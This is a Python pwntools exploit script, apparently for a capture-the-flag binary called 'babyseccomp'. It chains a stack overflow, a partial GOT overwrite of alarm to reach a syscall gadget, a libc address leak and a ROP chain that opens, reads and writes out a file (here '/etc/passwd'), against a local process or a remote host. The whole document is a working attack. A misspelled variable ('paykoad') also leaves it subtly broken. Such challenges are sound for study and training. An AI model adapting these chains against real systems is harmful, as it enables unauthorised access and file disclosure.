#!/usr/bin/env python
from pwn import *
import sys,time

HOST = 'None'
PORT = None

def info(s):
	log.info(s)

def exploit(p):
	rdi=0x0000000000400b03
	rsi_r15=0x0000000000400b01
	readGot=0x601040
	readIns=0x400a83
	alarmGot=0x601038
	alarm=0x400780
	rbp=0x601090+0x10
	read=0x400790
	poprbp=0x0000000000400a01
	payload='a'*8		# padding
	payload+=p64(alarmGot+8-0x18)	# rbp
	payload+=p64(readIns)	# call readStr
	p.sendline(payload)
	# over write alarm
	payload="a"*8
	payload+=p64(rbp)
	payload+=p64(readIns)
	payload+='\x05' # byte overwrite
	p.send(payload)
	time.sleep(5)
	
	# read 0x100 bytes
	payload='a'*8
	payload+=p64(rbp+0x50)
	payload+=p64(rdi)
	payload+=p64(rbp-8+0x60)
	payload+=p64(rsi_r15)
	payload+=p64(0x100)
	payload+=p64(0)
	payload+=p64(readIns+12)
	p.send(payload)
	# read n bytes ket qua tra ve luu trong rax
	payload="a"*0x30
	payload+=p64(rdi)
	payload+=p64(0)
	payload+=p64(rsi_r15)
	payload+=p64(rbp+0x100)
	payload+=p64(0)
	payload+=p64(read)
	# goi syscall write
	payload+=p64(rdi)
	payload+=p64(1)
	payload+=p64(rsi_r15)
	payload+=p64(readGot)
	payload+=p64(0)
	payload+=p64(alarm)
	payload+=p64(poprbp)
	payload+=p64(rbp+0x200)
	
	payload+=p64(readIns)
	p.sendline(payload)
	time.sleep(5)
	p.sendline('')
	readL=u64(p.recvuntil("\x7f").ljust(8,'\x00'))
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	base=readL-libc.symbols['read']
	info("read is 0x%x\nbase is 0x%x"%(readL,base))

	# read 0x100 bytes

	payload='a'*8
	paykoad+=p64(rbp+0x50)
	payload+=p64(rdi)
	payload+=p64(rbp+0x200)
	payload+=p64(rsi_r15)
	payload+=p64(0x100)
	payload+=p64(0)
	payload+=p64(readIns+12)
	payload+=p64(poprbp)
	payload+=p64(rbp+0x200-8)
	payload+=p64(0x400A99)
	p.send(payload)
	write=base+libc.symbols['write']
	openf=base+libc.symbols['open']

	time.sleep(2)
	# rdi=0, rsi=rbp+0x300, call read
	payload=p64(rdi)
	payload+=p64(0)
	payload+=p64(rsi_r15)
	payload+=p64(rbp+0x300)
	payload+=p64(0)
	payload+=p64(read)
	# rdi=rbp+0x300, rsi=0, call open, rsi=0 -> O_RONLY
	payload+=p64(rdi)
	payload+=p64(rbp+0x300)
	payload+=p64(rsi_r15)
	payload+=p64(0)
	payload+=p64(rbp+0x300)
	payload+=p64(openf)
	# rdi=3 (fd), rsi=rbp+0x400, call read
	payload+=p64(rdi)
	payload+=p64(3)
	payload+=p64(rsi_r15)
	payload+=p64(rbp+0x400)
	payload+=p64(0)
	payload+=p64(read)
	# rdi=1, rsi=rbp+0x400, call write
	payload+=p64(rdi)
	payload+=p64(1)
	payload+=p64(rsi_r15)
	payload+=p64(rbp+0x400)
	payload+=p64(0)
	payload+=p64(write)

	p.sendline(payload)

	p.sendline("/etc/passwd\x00")

	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./babyseccomp')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
